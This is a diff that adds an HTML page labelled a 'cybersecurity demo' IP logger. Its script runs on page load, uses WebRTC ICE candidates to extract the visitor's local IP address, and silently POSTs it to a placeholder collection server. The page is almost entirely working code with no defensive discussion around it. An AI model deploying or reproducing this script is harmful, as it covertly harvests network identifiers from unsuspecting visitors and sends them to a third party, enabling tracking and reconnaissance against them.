@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Private IP Logger for Cybersecurity Demo</h1>
+    <p>Loading your IP...</p>
+    <script>
+        async function logPrivateIP() {
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = event => {
+                if (event && event.candidate) {
+                    const candidate = event.candidate.candidate;
+                    if (candidate.includes("candidate")) {
+                        const localIP = candidate.split(" ")[4];
+                        console.log("Local IP:", localIP);
+                        // Log IP to your server by sending a request
+                        fetch('https://your-server.com/log', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ ip: localIP })
+                        });
+                    }
+                }
+            };
+        }
+        logPrivateIP();
+    </script>
+</body>
+</html>
